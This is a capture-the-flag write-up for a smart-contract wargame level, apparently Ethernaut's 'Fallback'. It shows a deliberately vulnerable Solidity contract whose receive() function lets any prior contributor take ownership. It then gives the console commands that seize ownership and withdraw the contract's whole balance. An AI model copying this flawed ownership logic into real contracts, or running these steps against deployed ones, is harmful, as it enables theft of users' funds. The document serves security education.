# Challenge 1

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```
Challenge
---
 > You will beat this level if

    1. you claim ownership of the contract
    2. you reduce its balance to 0 Things that might help

    How to send ether when interacting with an ABI
    How to send ether outside of the ABI
    Converting to and from wei/ether units (see help() command)
    Fallback methods
    Level author(s): Alejandro Santander

Solution : Challenge 1
---
1. if we look at the contract we see contribute function which has restriction and we can only send  less than `0.001 ether`. so we will send only `1 wei`.

2. next thing will we will send directly to contract we take look at the receive function msg.value > 0 && msg.sender > 0 then we will cliam the ownership of the contract let's we will force fully send ether via this command

```js
await contract.sendTransaction({value:toWei("0.02")}) 
```

this is the solution will get you the ownership of the contract

You can check the owner using
```js
await contract.owner()
```

you will see your account address. Now Last thing.

3. withdraw all the balance from the contract 
```js
await contract.withdraw()
```
you will get balance of the contract into your account and check the submit instance and you will pass the Challenge.